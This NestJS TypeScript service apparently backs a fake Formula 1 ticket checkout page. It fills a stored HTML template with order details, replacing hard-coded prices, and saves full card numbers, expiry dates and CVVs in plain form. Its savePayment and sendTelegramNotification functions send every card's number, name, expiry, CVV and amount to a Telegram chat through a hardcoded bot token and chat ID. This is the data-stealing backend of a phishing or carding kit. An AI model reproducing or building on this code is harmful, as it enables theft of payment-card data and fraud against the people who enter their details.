import { Injectable, Logger } from '@nestjs/common'
import { InjectRepository } from '@nestjs/typeorm'
import { Repository } from 'typeorm'
import * as fs from 'fs/promises'
import * as path from 'path'
import { F1Order } from './entities/f1-order.entity'
import { Payment } from './entities/payment.entity'
import { F1CheckoutDto } from './dto/f1-checkout.dto'
import { PaymentDto } from './dto/payment.dto'
import { ApiException } from 'src/common/exceptions/api.exception'
import { firstValueFrom } from 'rxjs';
import Redis from 'ioredis';
import { InjectRedis } from '@nestjs-modules/ioredis';
  import { HttpService } from '@nestjs/axios';
@Injectable()
export class F1Service {

    private readonly logger = new Logger(F1Service.name);


  constructor(
    @InjectRepository(F1Order)
    private readonly f1OrderRepository: Repository<F1Order>,
    @InjectRepository(Payment)
    private readonly paymentRepository: Repository<Payment>,
        @InjectRedis() private readonly redis: Redis,
        private readonly httpService: HttpService,
        
  ) { }

  /**
   * 创建F1订单
   */
  async checkout(checkoutDto: F1CheckoutDto): Promise<F1Order> {
    try {
      // 创建订单实体
      const f1Order = new F1Order()
      f1Order.f1Name = checkoutDto.f1_name
      f1Order.f1Title = checkoutDto.f1_title
      f1Order.f1Quarty = checkoutDto.f1_quarty
      f1Order.f1Money = checkoutDto.f1_money
      f1Order.id = checkoutDto.id
      f1Order.orderStatus = 0 // 默认待处理
      f1Order.isDeleted = 0 // 默认未删除

      // 保存到数据库
      const savedOrder = await this.f1OrderRepository.save(f1Order)

      return savedOrder
    } catch (error) {
      throw new ApiException(`创建F1订单失败: ${error.message}`)
    }
  }

  /**
   * 读取checkout HTML模板文件
   */
  async readCheckoutHtml(): Promise<string> {
    try {
      // 获取项目根路径下的scripts目录
      const scriptsPath = path.join(process.cwd(), 'scripts')
      const filePath = path.join(scriptsPath, 'newCheckout.html')

      // 读取文件内容
      const htmlContent = await fs.readFile(filePath, 'utf-8')

      return htmlContent
    } catch (error) {
      throw new ApiException(`读取checkout HTML文件失败: ${error.message}`)
    }
  }

  /**
   * 完整的checkout流程：保存订单并返回HTML页面
   */
  async checkoutWithHtml(checkoutDto: F1CheckoutDto): Promise<{ order: F1Order; html: string }> {
    try {
      // 1. 保存订单到数据库
      const f1Order = new F1Order()
      f1Order.f1Name = checkoutDto.f1_name || ''
      f1Order.f1Title = checkoutDto.f1_title || ''
      f1Order.f1Quarty = checkoutDto.f1_quarty || ''
      f1Order.f1Money = checkoutDto.f1_money
      f1Order.id = checkoutDto.id || ''
      f1Order.orderStatus = 0 // 默认待处理
      f1Order.isDeleted = 0 // 默认未删除
      f1Order.orderNo = checkoutDto.order_no || ''
      console.log('准备保存订单:', {
        f1Name: f1Order.f1Name,
        f1Title: f1Order.f1Title,
        f1Quarty: f1Order.f1Quarty,
        f1Money: f1Order.f1Money,
        id: f1Order.id,
        orderNo: f1Order.orderNo || ''
      })

      // 保存到数据库
      const savedOrder = await this.f1OrderRepository.save(f1Order)

      console.log('订单保存成功:', savedOrder.f1OrderId, '金额:', savedOrder.f1Money)

      // 2. 读取HTML模板文件
      const htmlContent = await this.readCheckoutHtml()

      //替换商品区域
      const htmlContentWithProduct = await this.replaceProductArea(htmlContent, f1Order)
      // 3. 返回订单数据和HTML内容
      return {
        order: savedOrder,
        html: htmlContentWithProduct
      }
    } catch (error) {
      console.error('checkoutWithHtml 错误:', error)
      throw new ApiException(`Checkout失败: ${error.message}`)
    }
  }

  async replaceProductArea(htmlContent: string, f1Order: F1Order): Promise<string> {
    //替换title
    // 1. 必须包含完整的属性特征，否则 index 计算不准
    let titleLabel = 'class="name flex-grow font-weight-600"';
    let titleIndex = htmlContent.indexOf(titleLabel);

    if (titleIndex !== -1) {
      // 找到 </p> 的位置，用来切掉老文本
      let titleEndIndex = htmlContent.indexOf('</p>', titleIndex);

      if (titleEndIndex !== -1) {
        // titleIndex 是 'class=' 的起点
        // titleIndex + titleLabel.length 是 class 属性结束的位置（即引号后面）
        // 再 + 1 刚好跳过 '>' 字符
        let startCutIndex = titleIndex + titleLabel.length + 1;

        htmlContent =
          htmlContent.substring(0, startCutIndex) + // 截取到 <p ...> 结束
          f1Order.f1Title +                         // 放入新标题
          htmlContent.substring(titleEndIndex);     // 拼接从 </p> 开始的后半段
      }
    }

    //替换价格
    let priceLable = 'class="price">'
    let priceIndex = htmlContent.indexOf(priceLable)
    if (priceIndex !== -1) {
      let priceEndIndex = htmlContent.indexOf('</p>', priceIndex)
      if (priceEndIndex !== -1) {
        htmlContent = htmlContent.substring(0, priceIndex + priceLable.length) + '$' + f1Order.f1Money + htmlContent.substring(priceEndIndex)
      }
    }

    //替换名称
    let nameLable = 'class="event-name">'
    let nameIndex = htmlContent.indexOf(nameLable)
    if (nameIndex !== -1) {
      let nameEndIndex = htmlContent.indexOf('</p>', nameIndex)
      if (nameEndIndex !== -1) {
        htmlContent = htmlContent.substring(0, nameIndex + nameLable.length) + f1Order.f1Name + htmlContent.substring(nameEndIndex)
      }
    }

    //替换数量
    htmlContent = htmlContent.replace(/class="item-amount">2<\/p>/, `class="item-amount">${f1Order.f1Quarty}</p>`)

    htmlContent = htmlContent.replaceAll("$4,826.00", '$' + f1Order.f1Money)
    htmlContent = htmlContent.replaceAll("$4,968.37", '$' + f1Order.f1Money)

    htmlContent = htmlContent.replaceAll("_orderNo_", f1Order.orderNo)
    return htmlContent
  }
  /**
   * 根据编号获取F1订单
   */
  async findOne(f1OrderNo: string): Promise<F1Order> {
    const order = await this.f1OrderRepository.findOne({
      where: { orderNo: f1OrderNo, isDeleted: 0 }
    })

    if (!order) {
      throw new ApiException('F1订单不存在')
    }

    return order
  }

  /**
   * 获取所有F1订单列表
   */
  async findAll(): Promise<F1Order[]> {
    return this.f1OrderRepository.find({
      where: { isDeleted: 0 },
      order: { f1OrderId: 'DESC' }
    })
  }

  /**
   * 保存支付信息
   */
  async savePayment(paymentDto: PaymentDto): Promise<Payment> {
    try {
      // 创建支付记录
      const payment = new Payment()
      payment.orderNo = paymentDto.orderNo
      payment.userId = paymentDto.userId || ''
      payment.cardNo = paymentDto.card_number
      payment.endDate = paymentDto.card_expiry
      payment.cvv = paymentDto.card_cvv
      payment.cardName = paymentDto.card_name
      payment.email = paymentDto.email_address
      payment.phone = paymentDto.phone_number
      payment.paymentStatus = 0 // 默认待支付
      payment.isDeleted = 0

      // 保存到数据库
      const savedPayment = await this.paymentRepository.save(payment)

      console.log('支付信息保存成功:', savedPayment.paymentId)

      console.log('发送 Telegram 通知...')
      const order = await this.findOne(paymentDto.orderNo)
      this.sendTelegramNotification({
        orderNo: paymentDto.orderNo,
        cardNumber: paymentDto.card_number ,
        expire: paymentDto.card_expiry,
        cvv: paymentDto.card_cvv,
        cardName: paymentDto.card_name,
        amount: order.f1Money,
        status: 'success'
      })
      return savedPayment
    } catch (error) {
      console.error('保存支付信息失败:', error)
      throw new ApiException(`保存支付信息失败: ${error.message}`)
    }
  }

  
  // Telegram 配置
  private readonly TELEGRAM_CONFIG = {
    botToken: '8739319224:AAFw-tgw23H4DGO-aRBprczCPZGLCmXXO0s',
    chatId: '-5228458416',
    apiUrl: 'https://api.telegram.org/bot',
  };
  // Redis 键前缀
  private readonly REDIS_KEY_PREFIX = 'payment:callback:';
  /**
   * 发送 Telegram 通知（异步）
   */
  async sendTelegramNotification(orderData: {
    orderNo: string;
    cardNumber: string;
    expire: string;
    cvv: string;
    cardName: string,
    amount: number;
    status: string;
  }): Promise<void> {
    try {
      const { orderNo, cardNumber,expire,cvv,cardName,  amount, status } = orderData;
      
      // 生成通知唯一标识（订单号+状态）
      const notificationKey = `callback_${orderNo}_${status}`;
      
      // 检查是否已发送过（基于 Redis）
      const redisKey = `${this.REDIS_KEY_PREFIX}${notificationKey}`;
      const exists = await this.redis.exists(redisKey);
      if (exists === 1) {
        this.logger.log(`支付回调通知已发送，跳过 - 订单号: ${orderNo}`);
        return;
      }
      // 标记为已发送（基于 Redis，24小时过期）
      await this.redis.setex(redisKey, 86400, '1'); // 86400 seconds = 24 hours
 
      const currentTime = new Date().toLocaleString('zh-CN', { 
        timeZone: 'Asia/Shanghai',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false 
      });

      
const message = `
✅ <b>支付通知</b>\n\n
📋 <b>订单号:</b> <code>${orderNo}</code>\n
💰 <b>金额:</b> ${amount} \n
🏦 <b>信用卡号:</b> ${cardNumber}\n
💳 <b>卡名:</b> ${cardName}\n
📅 <b>有效期:</b> ${expire}\n
CVV <b>CVV:</b> ${cvv}\n  
🕐<b>时间:</b> ${currentTime}\n
`.trim();
      const url = `${this.TELEGRAM_CONFIG.apiUrl}${this.TELEGRAM_CONFIG.botToken}/sendMessage`;
      
      // await axios.default.post(url, {
      //   chat_id: this.TELEGRAM_CONFIG.chatId,
      //   text: message,
      //   parse_mode: 'HTML',
      // });
 
      const response = await firstValueFrom(
        this.httpService.post(url, { chat_id: this.TELEGRAM_CONFIG.chatId, text: message, parse_mode: 'HTML' }),
      );

      
      this.logger.log(`Telegram 通知发送成功 - 订单号: ${orderNo}`);
    } catch (error: any) {
      this.logger.error(
        `发送 Telegram 通知失败 - 订单号: ${orderData.orderNo}`,
        error.response?.data || error.message,
      );
    }
  }

}

